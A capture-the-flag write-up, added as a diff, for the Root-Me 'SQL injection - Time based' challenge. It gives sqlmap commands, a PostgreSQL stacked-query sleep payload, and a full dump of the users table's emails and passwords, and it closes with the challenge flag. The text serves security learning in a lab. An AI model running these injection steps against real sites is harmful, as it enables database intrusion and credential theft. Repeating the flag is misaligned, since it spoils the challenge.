@@ -1,0 +1,75 @@
+SQL injection - Time based
+
+Statement
+Retrieve administrator’s password.
+
+http://challenge01.root-me.org/web-serveur/ch40/
+
+[POC]
+
+load url in sqlmap
+
+sqlmap -u "http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1" --time-sec=10 --dbs
+
+Parameter: member (GET)
+    Type: stacked queries
+    Title: PostgreSQL > 8.1 stacked queries (comment)
+    Payload: action=member&member=1;SELECT PG_SLEEP(10)--
+
+available databases [3]:
+[*] information_schema
+[*] pg_catalog
+[*] public
+
+then find the current db
+
+sqlmap -u "http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1" --time-sec=10 --current-db
+
+current schema (equivalent to database on PostgreSQL):    'public'
+
+find the tables from DB public
+
+sqlmap -u "http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1" --time-sec=10 -D public --tables
+
+Database: public
+[2 tables]
++--------------+
+| sqlmapoutput |
+| users        |
++--------------+
+
+get the columns from users table
+
+sqlmap -u "http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1" --time-sec=10 -D public -T users --columns
+
+Database: public
+Table: users
+[6 columns]
++-----------+---------+
+| Column    | Type    |
++-----------+---------+
+| email     | varchar |
+| firstname | varchar |
+| id        | int4    |
+| lastname  | varchar |
+| password  | varchar |
+| username  | varchar |
++-----------+---------+
+
+Let's dump it
+
+
+sqlmap -u "http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1" --time-sec=10 -D public -T users -C id,email,usermame,password --dump
+
+Database: public
+Table: users
+[3 entries]
++----+---------------------------+----------+---------------+
+| id | email                     | usermame | password      |
++----+---------------------------+----------+---------------+
+| 1  | ycam@sqlitimebased.com    | <blank>  | T!m3B@s3DSQL! |
+| 2  | jsilver@sqlitimebased.com | <blank>  | J0hNG0lDeN    |
+| 3  | jsparow@sqlitimebased.com | <blank>  | Sp@r0WKr@K3n  |
++----+---------------------------+----------+---------------+
+
+#flag = T!m3B@s3DSQL!
